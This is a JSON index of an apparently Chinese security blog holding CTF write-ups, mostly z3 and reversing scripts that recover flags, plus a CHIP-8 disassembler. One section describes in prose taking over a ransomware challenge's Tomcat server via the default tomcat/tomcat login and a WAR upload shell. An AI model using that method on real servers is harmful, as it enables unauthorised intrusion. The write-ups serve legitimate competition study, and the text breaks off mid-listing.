{"pages":[{"title":"404 Not Found：该页无法显示","text":"","link":"/404.html"},{"title":"about","text":"Focus on System Security Active in CTF, RE&amp;PWN Majoring in Information Security Developer &amp; CTFer Retired RoboCup player Linux lover &amp; User Rustaceans","link":"/about/index.html"},{"title":"分类","text":"","link":"/categories/index.html"},{"title":"友情链接","text":"","link":"/links/index.html"},{"title":"Repositories","text":"","link":"/repository/index.html"},{"title":"search","text":"","link":"/search/index.html"},{"title":"标签","text":"","link":"/tags/index.html"}],"posts":[{"title":"2020-信息安全竞赛创新实践赛-wp","text":"这国赛出的没什么意思，re就给了两道然后被打穿了，等了一天最后放出来一道智能合约…… z3直接解方程组得到flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110target = [0x00004F17, 0x00009CF6, 0x00008DDB, 0x00008EA6, 0x00006929, 0x00009911, 0x000040A2, 0x00002F3E, 0x000062B6,0x00004B82, 0x0000486C, 0x00004002, 0x000052D7, 0x00002DEF, 0x000028DC, 0x0000640D, 0x0000528F, 0x0000613B,0x00004781, 0x00006B17, 0x00003237, 0x00002A93, 0x0000615F, 0x000050BE, 0x0000598E, 0x00004656, 0x00005B31,0x0000313A, 0x00003010, 0x000067FE, 0x00004D5F, 0x000058DB, 0x00003799, 0x000060A0, 0x00002750, 0x00003759,0x00008953, 0x00007122, 0x000081F9, 0x00005524, 0x00008971, 0x00003A1D]from z3 import *def RecurOr(flags, models, pos=0): if (pos &amp;lt; len(flags) - 1): return Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + 1)) else: return Or(models[flags[pos]] != flags[pos])v = [Int('v%d' % (i + 46)) for i in range(42)]flag = []solver = Solver()for c in v: solver.add(c &gt;= 0x0) solver.add(c &lt;= 0xff)v46 = v[0]v47 = v[1]v48 = v[2]v49 = v[3]v50 = v[4]v51 = v[5]v52 = v[6]v53 = v[7]v54 = v[8]v55 = v[9]v56 = v[10]v57 = v[11]v58 = v[12]v59 = v[13]v60 = v[14]v61 = v[15]v62 = v[16]v63 = v[17]v64 = v[18]v65 = v[19]v66 = v[20]v67 = v[21]v68 = v[22]v69 = v[23]v70 = v[24]v71 = v[25]v72 = v[26]v73 = v[27]v74 = v[28]v75 = v[29]v76 = v[30]v77 = v[31]v78 = v[32]v79 = v[33]v80 = v[34]v81 = v[35]v82 = v[36]v83 = v[37]v84 = v[38]v85 = v[39]v86 = v[40]v87 = v[41]solver.add(target[0] == 34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52)solver.add(target[1] == 27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52)solver.add(target[2] == 24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52)solver.add(target[3] == 78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52)solver.add(target[4] == 48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52)solver.add(target[5] == 15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52)solver.add(target[6] == 26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52)solver.add(target[7] == 34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59)solver.add(target[8] == 27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59)solver.add(target[9] == 24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59)solver.add(target[10] == 78 * v54 + 39 * v53 + 52 * v55 + 9 * v56 + 62 * v57 + 37 * v58 + 84 * v59)solver.add(target[11] == 48 * v57 + 14 * v55 + 23 * v53 + 6 * v54 + 74 * v56 + 12 * v58 + 83 * v59)solver.add(target[12] == 15 * v58 + 48 * v57 + 92 * v55 + 85 * v54 + 27 * v53 + 42 * v56 + 72 * v59)solver.add(target[13] == 26 * v58 + 67 * v56 + 6 * v54 + 4 * v53 + 3 * v55 + 68 * v59)solver.add(target[14] == 34 * v63 + 12 * v60 + 53 * v61 + 6 * v62 + 58 * v64 + 36 * v65 + v66)solver.add(target[15] == 27 * v64 + 73 * v63 + 12 * v62 + 83 * v60 + 85 * v61 + 96 * v65 + 52 * v66)solver.add(target[16] == 24 * v62 + 78 * v60 + 53 * v61 + 36 * v63 + 86 * v64 + 25 * v65 + 46 * v66)solver.add(target[17] == 78 * v61 + 39 * v60 + 52 * v62 + 9 * v63 + 62 * v64 + 37 * v65 + 84 * v66)solver.add(target[18] == 48 * v64 + 14 * v62 + 23 * v60 + 6 * v61 + 74 * v63 + 12 * v65 + 83 * v66)solver.add(target[19] == 15 * v65 + 48 * v64 + 92 * v62 + 85 * v61 + 27 * v60 + 42 * v63 + 72 * v66)solver.add(target[20] == 26 * v65 + 67 * v63 + 6 * v61 + 4 * v60 + 3 * v62 + 68 * v66)solver.add(target[21] == 34 * v70 + 12 * v67 + 53 * v68 + 6 * v69 + 58 * v71 + 36 * v72 + v73)solver.add(target[22] == 27 * v71 + 73 * v70 + 12 * v69 + 83 * v67 + 85 * v68 + 96 * v72 + 52 * v73)solver.add(target[23] == 24 * v69 + 78 * v67 + 53 * v68 + 36 * v70 + 86 * v71 + 25 * v72 + 46 * v73)solver.add(target[24] == 78 * v68 + 39 * v67 + 52 * v69 + 9 * v70 + 62 * v71 + 37 * v72 + 84 * v73)solver.add(target[25] == 48 * v71 + 14 * v69 + 23 * v67 + 6 * v68 + 74 * v70 + 12 * v72 + 83 * v73)solver.add(target[26] == 15 * v72 + 48 * v71 + 92 * v69 + 85 * v68 + 27 * v67 + 42 * v70 + 72 * v73)solver.add(target[27] == 26 * v72 + 67 * v70 + 6 * v68 + 4 * v67 + 3 * v69 + 68 * v73)solver.add(target[28] == 34 * v77 + 12 * v74 + 53 * v75 + 6 * v76 + 58 * v78 + 36 * v79 + v80)solver.add(target[29] == 27 * v78 + 73 * v77 + 12 * v76 + 83 * v74 + 85 * v75 + 96 * v79 + 52 * v80)solver.add(target[30] == 24 * v76 + 78 * v74 + 53 * v75 + 36 * v77 + 86 * v78 + 25 * v79 + 46 * v80)solver.add(target[31] == 78 * v75 + 39 * v74 + 52 * v76 + 9 * v77 + 62 * v78 + 37 * v79 + 84 * v80)solver.add(target[32] == 48 * v78 + 14 * v76 + 23 * v74 + 6 * v75 + 74 * v77 + 12 * v79 + 83 * v80)solver.add(target[33] == 15 * v79 + 48 * v78 + 92 * v76 + 85 * v75 + 27 * v74 + 42 * v77 + 72 * v80)solver.add(target[34] == 26 * v79 + 67 * v77 + 6 * v75 + 4 * v74 + 3 * v76 + 68 * v80)solver.add(target[35] == 34 * v84 + 12 * v81 + 53 * v82 + 6 * v83 + 58 * v85 + 36 * v86 + v87)solver.add(target[36] == 27 * v85 + 73 * v84 + 12 * v83 + 83 * v81 + 85 * v82 + 96 * v86 + 52 * v87)solver.add(target[37] == 24 * v83 + 78 * v81 + 53 * v82 + 36 * v84 + 86 * v85 + 25 * v86 + 46 * v87)solver.add(target[38] == 78 * v82 + 39 * v81 + 52 * v83 + 9 * v84 + 62 * v85 + 37 * v86 + 84 * v87)solver.add(target[39] == 48 * v85 + 14 * v83 + 23 * v81 + 6 * v82 + 74 * v84 + 12 * v86 + 83 * v87)solver.add(target[40] == 15 * v86 + 48 * v85 + 92 * v83 + 85 * v82 + 27 * v81 + 42 * v84 + 72 * v87)solver.add(target[41] == 26 * v86 + 67 * v84 + 6 * v82 + 4 * v81 + 3 * v83 + 68 * v87)while (solver.check() == sat): flag = \"\" model = solver.model() for i in range(42): flag += chr(model[v[i]].as_long()) print(flag) solver.add(RecurOr(v, model))# flag{7e171d43-63b9-4e18-990e-6e14c2afe648} hyperthreading输入长度为42位的flag，然后创建了新的线程，里面对输入进行了处理，还有反调试，最后进行比较 处理过程有一些花指令，去了花指令之后可以看到处理的过程 取出其中一位，右移两位和左移六位之后的结果进行异或，然后再异或0x23 出来的结果加上0x23 索引加一，移向下一位，直接上脚本 1234567891011target = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90, 0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E,0x8B, 0x51, 0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90, 0x12, 0x91, 0x50, 0x12, 0xD2, 0x91,0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F]for i in range(len(target)): target[i] = ((target[i] - 0x23) &amp; 0xff) ^ 0x23 target[i] = ((target[i] &lt;&lt; 2) | (target[i] &gt;&gt; 6)) &amp; 0xff# print(target)flag = \"\"for i in target: flag += chr(i)print(flag)# flag{a959951b-76ca-4784-add7-93583251ca92} misc电脑被黑diskgenius挂载虚拟磁盘disk_dump，恢复被删除数据 恢复出了被删除的文件，但是是乱码，打开demo发现文件头elf，这个程序对flag文件进行了处理 上脚本逆向处理一下 1234567891011v4 = 34v5 = 0target = [0x44, 0x2A, 0x03, 0xE5, 0x29, 0xA3, 0xAF, 0x62, 0x05, 0x31, 0x4E, 0xF3, 0xD6, 0xEB, 0x90, 0x66,0x24, 0x5C, 0xB7, 0x92, 0xF6, 0xD7, 0x4D, 0x0B, 0x6A, 0x41, 0xA3, 0x85, 0xEF, 0x90, 0x5A, 0x7E,0x5B, 0xEC, 0xC1, 0xF0, 0xD4, 0x61, 0x12, 0x12, 0x45, 0xEB, 0xB8]flag = \"\"for i in target: v6 = i flag += chr(((v6 ^ v4) - v5) &amp;amp; 0xff) v4 += 34 v5 = (v5 + 2) &amp;amp; 0xFprint(flag)# flag{e5d7c4ed-b8f6-4417-8317-b809fc26c047} WamaCry1简易的勒索病毒，打包处理过，解包之后，查看一下student_unpacked，除了一些根本没用的按钮和输出之外，还调用了son.exe 在解包之后的文件中找到这个程序，分析一下程序逻辑 获取电脑名字，生成公钥和私钥对flag进行加密 连接服务器，ip和端口如图，向服务器发送电脑名和私钥 得到ip以后扫描端口，发现开放8080是tomcat的默认管理页面，尝试弱口令tomcat/tomcat进去项目管理页面，构造war包上传拿到shell，在/tmp/key/文件夹下发现私钥及勒索病毒服务器端 在服务器段拿到生成的私钥文件和服务器端运行的程序，查看私钥发现经过了处理，分析服务器端程序，先开放端口建立连接接收先发送的电脑名称，创建以电脑名命名的文件 rsa私钥有很多行，逐行接收，最关键的处理就是buf和1进行异或，这个异或只影响整数的最后一位，对应转换成的字符串的第一个字符，所以对私钥文件的第一列异或1还原回来","link":"/2020/08/28/2020-08-28-2020-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%B5%9B-wp/"},{"title":"2020-强网杯-wp","text":"赛题出的很有水平啊，第一天出去玩了一天，第二天才开始做，只做出了这么几题，看了一下firmware是个虚拟机，再多点时间应该也可以出 侧防这题比较简单，放在了，没有放在re分类，直接上脚本 12345678910111213byte_4010 = [0x51, 0x57, 0x42, 0x6C, 0x6F, 0x67, 0x73]target = \"Lx|dTUwe\\\\IvNhCBOLqDNfW}ImFZCtiyxO\\\\PW^ebD\"f = []for i in range(0, len(target), 4): f.append(target[i + 1]) f.append(target[i + 2]) f.append(target[i + 3]) f.append(target[i])flag = \"\"for i, c in enumerate(f): flag += chr((ord(c) - 65) ^ byte_4010[i % 7])print(flag)# flag{QWB_water_problem_give_you_the_score} xx_warmup_obf混淆+花指令+反调，从read或者strlen函数开始找起会比较方便，找到之后发现一位一位计算，为了节省时间，代码跑出一部分之后后面的flag可以直接猜出来 1234567891011121314151617181920212223242526272829303132333435363738394041424344from z3 import *def RecurOr(flags, models, pos=0): if pos &lt;= len(flags) - 1: return Or(models[flags[pos]] != flags[pos], RecurOr(flags, models, pos + 1)) else: return Or(models[flags[pos]] != flags[pos])f = [BitVec('v%d' % i, 16) for i in range(22)]flag = []solver = Solver()for c in f: solver.add(c &gt;= 0x0) solver.add(c &lt;= 0xff)solver.add(f[0] == ord('f'))solver.add(f[1] == ord('l'))solver.add(f[2] == ord('a'))solver.add(f[3] == ord('g'))solver.add(f[4] == ord('{'))solver.add((f[5] * 0x1eb9d + f[2] * 0x40a8c + f[3] * 0x3fb3f + f[4] * 0xfffb82cd + f[1] * 0xffffea88 + f[0] * 0xfffda7c3) &amp; 0xffffffff == 0xc78321)solver.add((f[6] * 0xfffd185d + f[5] * 0xfffe032d + f[2] * 0xfffc468a + f[3] * 0xFFFC0EA3 + f[4] * 0xFFFE5277 + f[1] * 0xfffc4328 + f[0] * 0x44DE) &amp; 0xffffffff == 0xF961DAEB)solver.add((f[6] * 0x35770 + f[5] * 0x1CC39 + f[2] * 0x4851 + f[3] * 0xFFFFE5B9 + f[4] * 0x36D92 + f[1] * 0xFFFCF9E1 + f[0] * 0x37C38 + f[7] * 0x4186D)&amp; 0xffffffff == 0x4B202E4)solver.add((f[6] * 0xFFFC4AB1 + f[5] * 0x0CB64 + f[2] * 0x1309E + f[3] * 0xFFFB995E + f[4] * 0x2E940 + f[1] * 0xFFFEB612 + f[0] * 0xFFFC631A + f[7] * 0xFFFCAA83 + f[8] * 0x16A0C) &amp; 0xffffffff == 0xFCDE9AB5)solver.add((f[6] * 0x37EB9 + f[5] * 0xFFFDD238 + f[2] * 0xFFFBE2C0 + f[3] * 0x17977 + f[4] * 0x29D39 + f[1] * 0xFFFBB74E + f[0] * 0xFFFD6E33 + f[7] * 0xFFFF0427 + f[8] * 0xFFFD0153 + f[9] * 0xFFFF66A5) &amp; 0xffffffff == 0xFBC7B90A)solver.add((f[6] * 0x1DAAC + f[5] * 0xFFFE92AC + f[2] * 0xFFFF9AD4 + f[3] * 0x2C78D + f[4] * 0xFFFC69EE + f[1] * 0xFFFC1736 + f[0] * 0x47762 + f[7] * 0x28557 + f[8] * 0x27B6D + f[9] * 0xFFFF7F4E + f[10] * 0x2F9DF) &amp; 0xffffffff == 0x1AF43AB)solver.add((f[6] * 0xFFFDFD46 + f[5] * 0xFFFBD6F6 + f[2] * 0x13A87 + f[3] * 0x42997 + f[4] * 0x244E9 + f[1] * 0x20A60 + f[0] * 0x0C3F6 + f[7] * 0xFFFC0F74 + f[8] * 0xFFFE4DC8 + f[9] * 0xFFFE94DC + f[10] * 0xFFFFECB4 + f[11] * 0xFFFD79C6) &amp; 0xffffffff == 0xFEAFEC1F)solver.add((f[6] * 0xFFFE7848 + f[5] * 0x23EE3 + f[2] * 0xFFFCBAB4 + f[3] * 0x27C92 + f[4] * 0xFFFBFD5C + f[1] * 0xFFFD30C3 + f[0] * 0x5009 + f[7] * 0xFFFE93F1 + f[8] * 0xFFFDE3F3 + f[9] * 0x228DC + f[10] * 0x25EE + f[11] * 0xF242 + f[12] * 0x1160E) &amp; 0xffffffff == 0xFE20EC14)solver.add((f[6] * 0x648B + f[5] * 0xFFFCF002 + f[2] * 0xFFFE2E15 + f[3] * 0x1E041 + f[4] * 0x594B + f[1] * 0xFFFF3713 + f[0] * 0xFFFED96C + f[7] * 0x1C620 + f[8] * 0xFFFF282A + f[9] * 0xFFFF0E48 + f[10] * 0xFFFEAC54 + f[11] * 0xEA5F + f[12] * 0x35CF4 + f[13] * 0xFFFC920E) &amp; 0xffffffff == 0xFDCA76A0)solver.add((f[6] * 0x107E1 + f[5] * 0x440D9 + f[2] * 0xFFFFF5C3 + f[3] * 0x30766 + f[4] * 0x21281 + f[1] * 0x235C2 + f[0] * 0x1B2CE + f[7] * 0x16687 + f[8] * 0x493EC + f[9] * 0x26716 + f[0xA] * 0xFFFC84CB + f[0xB] * 0xFFFEA6FA + f[0xC] * 0xFFFC2F98 + f[0xD] * 0xFFFD1A3E + f[0xE] * 0x390BF) &amp; 0xffffffff == 0x5920B01)solver.add((f[6] * 0x24225 + f[5] * 0xFFFD39FC + f[2] * 0x1EAE2 + f[3] * 0x2F613 + f[4] * 0xFFFC66F9 + f[1] * 0xFFFE0433 + f[0] * 0x3E19 + f[7] * 0x1BDFF + f[8] * 0xFFFC6EAB + f[9] * 0xFFFD810C + f[0xA] * 0x0D519 + f[0xB] * 0x384EC + f[0xC] * 0x197E5 + f[0xD] * 0xFFFFD159 + f[0xE] * 0xFFFF43D9 + f[0xF] * 0xFFFC28DF) &amp; 0xffffffff == 0xFDD0E812)solver.add((f[6] * 0x111A3 + f[5] * 0xFFFF32EB + f[2] * 0x3E3F9 + f[3] * 0xFFFE9E4B + f[4] * 0xFFFFFB1A + f[1] * 0xFFFF65B9 + f[0] * 0xFFFDF970 + f[7] * 0xFFFB936C + f[8] * 0xFFFEF482 + f[9] * 0x57B6 + f[0xA] * 0x8813 + f[0xB] * 0x25CDC + f[0xC] * 0x12190 + f[0xD] * 0x427BE + f[0xE] * 0xFFFC8358 + f[0xF] * 0xFFFCE4EE + f[0x10] * 0x43BB5) &amp; 0xffffffff == 0xFF9ADC73)solver.add((f[6] * 0xFFFC313D + f[5] * 0x1023B + f[2] * 0x2E27A + f[3] * 0xFFFDCCD4 + f[4] * 0xFFFE498F + f[1] * 0xFFFFEC0D + f[0] * 0x3A1A3 + f[7] * 0xFFFCC8E2 + f[8] * 0xFFFC37B6 + f[9] * 0xFFFF2FE9 + f[0xA] * 0xFFFE8E68 + f[0xB] * 0x1F45C + f[0xC] * 0xFFFEAC48 + f[0xD] * 0xFFFDBD08 + f[0xE] * 0x2A28 + f[0xF] * 0xD72D + f[0x10] * 0xFFFF70B8 + f[0x11] * 0xFFFFE90F) &amp; 0xffffffff == 0xFCD6008F)solver.add((f[6] * 0xFFFBB7A0 + f[5] * 0xFFFF0015 + f[2] * 0xFFFD2918 + f[3] * 0x1882D + f[4] * 0xFFFEDE1F + f[1] * 0x2FB77 + f[0] * 0x20D94 + f[7] * 0x14A94 + f[8] * 0xFFFDA0CD + f[9] * 0xDE69 + f[0xA] * 0x2FE8 + f[0xB] * 0x2ABE5 + f[0xC] * 0x26530 + f[0xD] * 0x4C3D + f[0xE] * 0x2383E + f[0xF] * 0x42763 + f[0x10] * 0xE5C9 + f[0x11] * 0x539 + f[0x12] * 0xFFFC5AF3) &amp; 0xffffffff == 0x39F3331)solver.add((f[6] * 0xFFFD67BD + f[5] * 0xFFFCFC61 + f[2] * 0x21FB1 + f[3] * 0x2AFE7 + f[4] * 0xFFFE2316 + f[1] * 0xFFFDE3DE + f[0] * 0xFFFCF431 + f[7] * 0xFFFF1A07 + f[8] * 0xFFFD1877 + f[9] * 0xFFFBAB46 + f[0xA] * 0xFFFFB7A8 + f[0xB] * 0x44C76 + f[0xC] * 0x3C062 + f[0xD] * 0x26DA8 + f[0xE] * 0x217FE + f[0xF] * 0x27911 + f[0x10] * 0xD484 + f[0x11] * 0x217F6 + f[0x12] * 0xFFFF711C + f[0x13] * 0xFFFE6835) &amp; 0xffffffff == 0x4AF658)solver.add((f[6] * 0x6C67 + f[5] * 0x4210C + f[2] * 0x24372 + f[3] * 0xFFFF64A1 + f[4] * 0xFFFE83FC + f[1] * 0xFFFC59E3 + f[0] * 0x1A675 + f[7] * 0x29403 + f[8] * 0x122E6 + f[9] * 0x479E1 + f[0xA] * 0xFFFE556B + f[0xB] * 0xFFFEE2E8 + f[0xC] * 0xFFFD0C98 + f[0xD] * 0xF761 + f[0xE] * 0xFFFCF4FD + f[0xF] * 0x24A14 + f[0x10] * 0x2C39B + f[0x11] * 0xFFFF914F + f[0x12] * 0x94F9 + f[0x13] * 0x1F3A9 + f[0x14] * 0xFFFD85A7) &amp; 0xffffffff == 0x2B77651)solver.add((f[6] * 0x0B245 + f[5] * 0x47951 + f[2] * 0x3C177 + f[3] * 0x2026C + f[4] * 0x2BD3A + f[1] * 0x0AE83 + f[0] * 0xFFFF67E2 + f[7] * 0x0FC81 + f[8] * 0xFFFD1DCD + f[9] * 0xFFFE7D87 + f[0xA] * 0x40428 + f[0xB] * 0x1AC25 + f[0xC] * 0x47B95 + f[0xD] * 0xFFFBD35D + f[0xE] * 0xFFFD55C5 + f[0xF] * 0x255EF + f[0x10] * 0xFFFCA285 + f[0x11] * 0x1B4F2 + f[0x12] * 0xFFFBA306 + f[0x13] * 0x3B929 + f[0x14] * 0xEC4C+f[0x15]*0xFFFCD49C) &amp; 0xffffffff == 0x49F26C9)while solver.check() == sat: flag = \"\" model = solver.model() for i in range(len(f)): flag += chr(model[f[i]].as_long()) print(flag) solver.add(RecurOr(f, model))# flag{g0_Fuck_xx_5egm3n 根据题目描述，先做这个热热身，做完这个再去做xx_segment_obf也不迟，猜测flag为 1flag{g0_Fuck_xx_5egm3nt_0bf} 提交成功 imitation_game运行程序，首先输出flag提示，flag有两部分，先过第一部分才会运行第二部分的程序 调试程序，调试过程中发现AES的s-box，发现输入了明文之后在后面pad了32位\\x1a，然后进行AES-CBC加密，密钥和iv还有最终运行的结果可以在内存里找到，直接解密 1234567891011121314151617181920212223242526272829303132333435from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexdef add_to_16(text): if len(text.encode('utf-8')) % 16: add = 16 - (len(text.encode('utf-8')) % 16) else: add = 0 text = text + ('\\0' * add) return text.encode('utf-8')def encrypt(text): key = b\"\\x3E\\x2C\\x25\\x13\\x18\\xBE\\xC3\\x6B\\xA1\\x37\\x24\\x53\\x03\\x1E\\x51\\xEC\" iv = b\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2A\\x2B\\x2C\\x2D\\x2E\\x2F\" mode = AES.MODE_CBC text = add_to_16(text) cryptos = AES.new(key, mode, iv) cipher_text = cryptos.encrypt(text) return b2a_hex(cipher_text)def decrypt(text): key = b\"\\x3E\\x2C\\x25\\x13\\x18\\xBE\\xC3\\x6B\\xA1\\x37\\x24\\x53\\x03\\x1E\\x51\\xEC\" iv = b\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2A\\x2B\\x2C\\x2D\\x2E\\x2F\" mode = AES.MODE_CBC cryptos = AES.new(key, mode, iv) plain_text = cryptos.decrypt(a2b_hex(text)) return plain_textif __name__ == '__main__': e = encrypt(\"6c8f1d78770fe672122478c6f9a150e8\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\\x1a\") d = decrypt(b\"9D7BA23CB1099A4841D16663D6AE3CAB87ED59C2D3DA2A05BA5129C15D426A9A0514DBBEAE838B6FD3594152344E39C566E1E3EC0618149F4EB770009077D8AE\") print(\"加密:\", e) print(\"解密:\", d)# 6c8f1d78770fe672122478c6f9a150e8 得到第一部分flag，进入第二部分，调用了game.bin文件，根据提示是一个chip8的模拟器，一共输入10位数，错误则提示dead 有了提示之后好做了很多，根据chip8的指令集解析一下game.bin文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283with open('game.txt', 'r+') as f: s = f.read() # print(s)j = 0for i in range(0, len(s), 5): t = s[i:i + 4] # print(t) print(\"addr:\" + hex(j + 0x200), end=\" \") j += 2 if t[0] == '0': if t[1] == '0' and t[2] == 'e': if t[3] == '1': print(\"clear screen\") elif t[3] == 'f': print(\"Returns from a subroutine\") else: print(\"call program at addr: \" + t[1:]) else: print(\"call program at addr: \" + t[1:]) elif t[0] == '1': print(\"jmp \" + t[1:]) elif t[0] == '2': print(\"call \" + t[1:]) elif t[0] == '3': print(\"Skips the next instruction if V\" + t[1] + \" equals \" + t[2:]) elif t[0] == '4': print(\"Skips the next instruction if V\" + t[1] + \" not equals \" + t[2:]) elif t[0] == '5': print(\"Skips the next instruction if V\" + t[1] + \" equals V\" + t[2]) elif t[0] == '6': print(\"V\" + t[1] + \" = \" + t[2:]) elif t[0] == '7': print(\"V\" + t[1] + \" += \" + t[2:]) elif t[0] == '8': VX = \"V\" + t[1] VY = \"V\" + t[2] if t[-1] == '0': print(VX + \" = \" + VY) elif t[-1] == '1': print(VX + \" = \" + VX + \" | \" + VY) elif t[-1] == '2': print(VX + \" = \" + VX + \" &amp; \" + VY) elif t[-1] == '3': print(VX + \" = \" + VX + \" ^ \" + VY) elif t[-1] == '4': print(VX + \" += \" + VY, \" set VF=1 if VX&gt;=255\") elif t[-1] == '5': print(VX + \" -= \" + VY, \" set VF=0 if VX&lt;=0\") elif t[-1] == '6': print(VX + \" &gt;&gt;= 1\", \" the last one to VF\") elif t[-1] == '7': print(VX + \" = \" + VY + \" - \" + VX, \" set VF=0 if VX&amp;lt;0\") elif t[-1] == 'e': print(VX + \" &lt;&lt;= 1\", \" the first one to VF\") else: print(\"Invalid instruction: \" + t) elif t[0] == '9': print(\"Skips the next instruction if V\" + t[1] + \" not equals V\" + t[2]) elif t[0] == 'a': print(\"set I = \" + t[1:]) elif t[0] == 'b': print(\"jmp V0+\" + t[1:]) elif t[0] == 'c': print(\"V\" + t[1] + \"=rand()&amp;\" + t[2:]) elif t[0] == 'd': print(\"display at (V\" + t[1] + \",\" + \"V\" + t[2] + \") for \" + t[3] + \"rows\") elif t[0] == 'e': print(\"something about buttons\") elif t[0] == 'f': if t[2:] == '29': print(\"set I=\" + \"V\" + t[1]) elif t[2:] == \"0a\": print(\"set V\" + t[1] + \" = button pressed\") elif t[2:] == \"55\": print(\"store V0-V\" + t[1] + \" to addr start at I\") elif t[2:] == \"65\": print(\"store addr start at I to V0-V\" + t[1]) elif t[2:] == \"33\": print(\"set BCD(V\" + t[1] + \")\") else: print(t[2:]) else: print(\"Invalid instruction: \" + t) 解析之后根据程序的运行流程看一下大概过程，读取按键在屏幕上指定位置显示出来，直到10位都读取完，然后进行一些判断，错误就会显示dead，正确直接退出程序，不会有显示。然后详细看一下程序 程序开始一个跳转从2ce开始，根据chip8内存的排布规律，可执行代码从200开始 123456789101112131415161718addr:0x2ce Ve = 10addr:0x2d0 set I=Veaddr:0x2d2 store V0-Ve to addr start at Iaddr:0x2d4 Vf = 03addr:0x2d6 Ve += Vf set VF=1 if VX&gt;=255addr:0x2d8 call 928addr:0x2da V0 = Vfaddr:0x2dc V1 = 05addr:0x2de V2 = 08addr:0x2e0 V3 = V0addr:0x2e2 set I=Veaddr:0x2e4 store V0-Ve to addr start at Iaddr:0x2e6 Vf = 03addr:0x2e8 Ve += Vf set VF=1 if VX&gt;=255addr:0x2ea V0 = V1addr:0x2ec V1 = V2addr:0x2ee V2 = V3addr:0x2f0 call 938 首先是10个这样的过程用于输入和显示 其中928用于读取输入，记录按键信息 12345678addr:0x928 V0 = ffaddr:0x92a set V0 = button pressedaddr:0x92c Vf = 03addr:0x92e Ve -= Vf set VF=0 if VX&lt;=0addr:0x930 Vf = V0addr:0x932 set I=Veaddr:0x934 store addr start at I to V0-Veaddr:0x936 Returns from a subroutine 938用于输出到显示屏上 123456789101112131415addr:0x938 V5 = V2addr:0x93a V4 = V1addr:0x93c V3 = V0addr:0x93e V6 = 00addr:0x940 set BCD(V5)addr:0x942 store addr start at I to V0-V2addr:0x944 set I=V5addr:0x946 display at (V3,V4) for 5rowsaddr:0x948 V6 = V6 | Vfaddr:0x94a Vf = 03addr:0x94c Ve -= Vf set VF=0 if VX&amp;lt;0addr:0x94e Vf = V6addr:0x950 set I=Veaddr:0x952 store addr start at I to V0-Veaddr:0x954 Returns from a subroutine 经过10次这样的操作之后，显示屏上显示出10个输入的数，分别存储在寄存器V0到V9中，接下来对这些输入的数值进行处理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667addr:0x436 Va = Vfaddr:0x438 Va = V0addr:0x43a Vb = V0addr:0x43c Vc = 02addr:0x43e Vb += Vc set VF=1 if VX&gt;=255addr:0x440 Va = Vbaddr:0x442 V0 = Vaaddr:0x444 Va = V1addr:0x446 Vb = V1addr:0x448 Vc = 01addr:0x44a Vb += Vc set VF=1 if VX&gt;=255addr:0x44c Va = Vbaddr:0x44e V1 = Vaaddr:0x450 Va = V2addr:0x452 Vb = V2addr:0x454 Vc = 01addr:0x456 Vb += Vc set VF=1 if VX&gt;=255addr:0x458 Vc = 01addr:0x45a Vb = Vb ^ Vcaddr:0x45c Va = Vbaddr:0x45e V2 = Vaaddr:0x460 Va = V3addr:0x462 Vb = V3addr:0x464 Vc = 03addr:0x466 Vb += Vc set VF=1 if VX&gt;=255addr:0x468 Va = Vbaddr:0x46a V3 = Vaaddr:0x46c Va = V4addr:0x46e Vb = V4addr:0x470 Vc = 02addr:0x472 Vb += Vc set VF=1 if VX&gt;=255addr:0x474 Va = Vbaddr:0x476 V4 = Vaaddr:0x478 Va = V5addr:0x47a Vb = V5addr:0x47c Vc = 02addr:0x47e Vb = Vb ^ Vcaddr:0x480 Vc = 01addr:0x482 Vb += Vc set VF=1 if VX&gt;=255addr:0x484 Va = Vbaddr:0x486 V5 = Vaaddr:0x488 Va = V6addr:0x48a Vb = V6addr:0x48c Vc = V6addr:0x48e Vb += Vc set VF=1 if VX&gt;=255addr:0x490 Va = Vbaddr:0x492 V6 = Vaaddr:0x494 Va = V7addr:0x496 Vb = V7addr:0x498 Vc = 01addr:0x49a Vb += Vc set VF=1 if VX&gt;=255addr:0x49c Va = Vbaddr:0x49e V7 = Vaaddr:0x4a0 Va = V8addr:0x4a2 Vb = V8addr:0x4a4 Vc = 01addr:0x4a6 Vb = Vb ^ Vcaddr:0x4a8 Vc = 01addr:0x4aa Vb += Vc set VF=1 if 